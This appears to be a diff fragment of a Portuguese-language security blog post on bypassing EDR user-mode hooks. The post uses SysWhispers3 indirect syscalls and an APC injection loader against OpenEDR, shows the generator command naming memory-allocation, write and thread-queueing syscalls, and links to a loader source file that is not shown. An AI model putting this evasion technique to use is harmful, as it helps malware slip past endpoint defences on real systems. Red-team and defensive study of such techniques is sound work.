+                                   |      
+                                   |       
+                                   |      
+                                EDR.DLL
+</code>
+<p>Podemos ignorar isso chamando a syscall indiretamente utilizando o SysWhispers3, que gera stubs para chamadas de syscall', 
+evitando hooks de API. Isso permite que o programa interaja com o kernel sem passar por funções monitoradas pelo EDR.
+Ao utilizar SysWhispers, é possível gerar cabeçalhos e implementações que encapsulam chamadas de syscall, permitindo 
+que o desenvolvedor invoque funções do kernel de forma discreta. evitando detecções baseadas em hooks de API. </p>
+</p><p><img src="../../static/Usermode_hooking_principle.png" alt="map"></p>
+<h2 id="ignorando-a-solu-o-av">Ignorando a solução AV</h2>
+<p>Vamos instalar o OpenEDR da xcitium para a POC final.
+<a href="https://www.openedr.com/">https://www.openedr.com/</a></p>
+<p><img src="../../static/edr.png" alt="map"></p>
+<p>vamos então usar o github.com/klezVirus/SysWhispers3 e criar um loader com APC e indirect syscalls</p>
+<p>python syswhispers.py --functions 
+    NtAllocateVirtualMemory,
+    NtWriteVirtualMemory,
+    NtProtectVirtualMemory,
+    NtCreateThreadEx,
+    NtQueueApcThread,
+    NtResumeThread,
+    NtWaitForSingleObject -o syscalls_mem
+</p>
+<p>codigo final:
+<a href="final-code.txt">loader.c</a>
+<p><img src="../../static/bypass.png" alt="map"></p>
+
